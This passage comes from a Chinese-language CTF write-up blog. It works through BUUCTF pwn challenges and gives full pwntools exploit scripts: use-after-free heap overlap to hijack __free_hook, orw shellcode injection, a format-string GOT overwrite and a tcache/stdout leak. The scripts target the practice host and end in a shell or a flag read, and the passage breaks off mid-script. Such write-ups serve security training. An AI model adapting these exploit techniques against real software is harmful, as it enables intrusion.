alt=""></p><p>增删查改四个功能，<strong>add</strong>功能有点冗长，主要就是分配两个chunk，一个大小为<strong>0x20</strong>，一个<strong>0x90</strong>，前者的内容为后者的指针和一个标志位，记录该chunk是否被修改过(只允许修改一次)，<strong>0x90</strong>大小的chunk的数据段的前0x10大小记录<strong>name</strong>和<strong>sex</strong>，后0x70记录<strong>information</strong></p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/5.jpg" alt=""></p><p>漏洞点位于<strong>dele</strong>函数，<strong>uaf</strong>漏洞</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/6.jpg" alt=""></p><p>并且<strong>edit</strong>和<strong>show</strong>功能通过0x20大小chunk中存在的指针来进行相应操作，这也可以利用.由于我们可以分配的chunk大小固定为0x20和0x90，所以无法攻击<strong>malloc_hook</strong>,这里采用改<strong>free_hook</strong>为<strong>system</strong>的攻击方式，exp如下:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./gyctf_2020_document'</span><span class="token comment" spellcheck="true"># io = process('./gyctf_2020_document')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">28239</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'gyctf_2020_document'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> data<span class="token punctuation">,</span> sex<span class="token operator">=</span><span class="token string">'F'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'input name'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>name<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'input sex'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>sex<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'information'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> data<span class="token punctuation">,</span> change<span class="token operator">=</span><span class="token string">'Y'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'sex?'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>change<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'information'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x70</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c4b78</span>__free_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'__free_hook => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>__free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__free_hook<span class="token number">-0x10</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'\x31'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(io)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>利用<strong>uaf</strong>漏洞，造成堆块重叠，使我们可以控制0x20大小的chunk中的指针，将指针改为<strong>free_hook</strong>的地址即可，然后利用edit修改为<strong>system</strong></p><h2 id="0x3-极客大挑战-2019-Not-Bad"><a href="#0x3-极客大挑战-2019-Not-Bad" class="headerlink" title="0x3.[极客大挑战 2019]Not Bad"></a>0x3.[极客大挑战 2019]Not Bad</h2><p>这题没有任何保护，存在沙箱，无法getshell，所以考虑使用<strong>orw</strong>攻击读取flag</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/8.jpg" alt=""></p><p>程序在<strong>0x123000</strong>处开辟了一块内存</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/9.jpg" alt=""></p><p>考虑首先在栈中利用shellcode往<strong>0x123000</strong>处写入orw的shellcode，然后调用0x123000处的shellcode即可，exp如下:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span> sleepcontext<span class="token punctuation">.</span>binary<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./bad'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true">#io = process('./bad')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">28529</span><span class="token punctuation">)</span>jmp_rsp <span class="token operator">=</span> <span class="token number">0x400a01</span>orw_payload <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">'./flag'</span><span class="token punctuation">)</span>orw_payload <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x123100</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span>orw_payload <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x123100</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x123000</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> \    asm<span class="token punctuation">(</span><span class="token string">'mov rax,0x123000;call rax'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>jmp_rsp<span class="token punctuation">)</span>payload <span class="token operator">+=</span> asm<span class="token punctuation">(</span><span class="token string">'sub rsp,0x30;jmp rsp'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'have fun!'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>orw_payload<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0x4-axb-2019-fmt64"><a href="#0x4-axb-2019-fmt64" class="headerlink" title="0x4.axb_2019_fmt64"></a>0x4.axb_2019_fmt64</h2><p>程序无限循环，got表可写</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/10.jpg" alt=""></p><p>首先泄露libc地址，然后将<strong>printf</strong>的<strong>got</strong>表值修改为<strong>system</strong>的地址，输入<strong>/bin/sh</strong>即可getshell.exp如下：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true">#io = process('./axb_2019_fmt64')</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26696</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./axb_2019_fmt64'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'lock'</span> <span class="token operator">+</span> <span class="token string">'%9$s'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'puts_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>offset0 <span class="token operator">=</span> system_addr <span class="token operator">&amp;</span> <span class="token number">0xffff</span>offset1 <span class="token operator">=</span> system_addr <span class="token operator">>></span> <span class="token number">16</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'offset0 => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>offset0<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'offset1 => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>offset1<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'%'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>offset0<span class="token number">-9</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%12$hn'</span>payload <span class="token operator">+=</span> <span class="token string">'%'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>offset1<span class="token operator">-</span>offset0<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%13$hn'</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">';/bin/sh'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>由于printf的地址和system的地址只有后5位不一样，所以我们修改后三个字节即可，不过这里我们依然修改后四个字节，</p><pre class=" language-python"><code class="language-python"><span class="token string">'%'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>offset0<span class="token number">-9</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%12$hn'</span></code></pre><p>这一句是修改后两个字节，-9是因为前面还会输出<strong>Repeater:</strong>，即已经输出了9个字节，所以我们要减去9</p><pre class=" language-python"><code class="language-python"><span class="token string">'%'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>offset1<span class="token operator">-</span>offset0<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%13$hn'</span></code></pre><p>这一句则是修改倒数第三和第四个字节，由于已经输出了<strong>offset0</strong>个字节，所以要减去<strong>offset0</strong></p><p>剩下的payload就是八字节对齐，把printf和printf+2放在对应的位置上</p><h2 id="0x5-roarctf-2019-realloc-magic"><a href="#0x5-roarctf-2019-realloc-magic" class="headerlink" title="0x5.roarctf_2019_realloc_magic"></a>0x5.roarctf_2019_realloc_magic</h2><p>这题考点在于realloc，函数原型如下</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">realloc</span><span class="token punctuation">(</span> <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token punctuation">[</span>size_t<span class="token punctuation">]</span>new_size <span class="token punctuation">)</span></code></pre><p><strong>ptr</strong> 为需要重新分配的内存空间指针，<strong>new_size</strong>为新的内存空间的大小</p><p>具体用法为</p><blockquote><p>size == 0 ，這個時候等同於free<br>realloc_ptr == 0 &amp;&amp; size &gt; 0 ， 這個時候等同於malloc<br>malloc_usable_size(realloc_ptr) &gt;= size， 這個時候等同於edit<br>malloc_usable_size(realloc_ptr) &lt; szie， 這個時候才是malloc一塊更大的記憶體，將原來的內容複製過去，再將原來的chunk給free掉</p></blockquote><p>即，根据ptr和size值的不同，realloc将有free，malloc，edit和extend四种功能再回到题目来</p><p>程序保护全开，有三个功能</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/11.jpg" alt=""></p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/12.jpg" alt=""></p><p>re功能就是通过realloc分配chunk</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/13.jpg" alt=""></p><p>fr功能就是free掉当前指针指向的chunk，存在uaf漏洞</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/14.jpg" alt=""></p><p>ba功能就是将指针清零，只能使用一次</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/15.jpg" alt=""></p><p>由于程序缺少show功能，所以我们需要改stdout来泄露地址，exp如下</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true">#!coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#context.log_level = 'debug'</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.27_x64.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">realloc</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Size?'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content?'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    realloc<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span>    <span class="token punctuation">[</span>free<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true"># fill tcache</span>    <span class="token comment" spellcheck="true">#gdb.attach(io)</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># to unsortbin fd->arena</span>    realloc<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x180</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token operator">*</span><span class="token number">0x78</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x87</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># overlap</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># get _IO_2_1_stdout_  修改flag和write_base</span>    realloc<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x58</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># get_libc</span>    libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x7f"</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">)</span>                    <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3e82a0</span>      <span class="token keyword">if</span> libc_base <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">0x3e82a0</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc_base => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    free_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>    one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x4f322</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"free_hook => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"one_gadget => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'666'</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x120</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x130</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x170</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x130</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    <span class="token punctuation">[</span>free<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token 